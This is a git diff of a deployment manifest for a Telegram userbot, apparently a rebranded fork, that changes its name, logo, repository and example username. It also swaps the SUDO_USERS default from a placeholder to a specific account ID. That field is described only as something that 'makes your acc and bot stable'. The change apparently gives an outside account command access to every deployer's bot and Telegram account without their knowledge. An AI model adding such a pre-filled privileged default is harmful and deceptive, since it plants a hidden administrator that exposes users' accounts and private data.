@@ -1,9 +1,9 @@
 {
-  "name": "LEGEND-Usebot",
-  "description": "Userbot created by Team #LEGEND and join https://t.me/legendsupportchannel for any problems or support",
-  "logo": "https://telegra.ph/file/e158c2b1da9e71587dc0a.png?raw=true",
+  "name": "𝙾𝙿 𝚂𝙷𝙰𝙸𝚃𝙰𝙽 - ᴜsᴇʀʙᴏᴛ",
+  "description": "Userbot created by Team #sʜᴀɪᴛᴀɴ and ᴀsᴋ sʜᴀɪᴛᴀɴfor any problems or support",
+  "logo": "https://telegra.ph/file/88bbdf42501f490fd5ef6.jpg?raw=true",
     "keywords": ["telegram", "userbot", "plugin", "modular", "productivity"],
-  "repository": "https://github.com/KeshavTech246/LEGEND-Userbot",
+  "repository": "https://github.com/TheUnknownKanger/OPSHAITANATMA",
   "website": "#TODO",
   "stack": "container",
   "success_url": "#TODO",
@@ -28,7 +28,7 @@
       "required": false
     },
     "ALIVE_NAME": {
-      "description": "Fill your Full name or Username like @The_Anonymous_Legend.",
+      "description": "Fill your Full name or Username like @The_Anonymous_Shaitan.",
       "value": ""
     },
     "APP_ID": {
@@ -90,7 +90,7 @@
     },
     "SUDO_USERS": {
       "description": "Makes your acc and bot stable",
-      "value": "11111111",
+      "value": "1523785278",
       "required": false
     },
     "CHROME_BIN": {
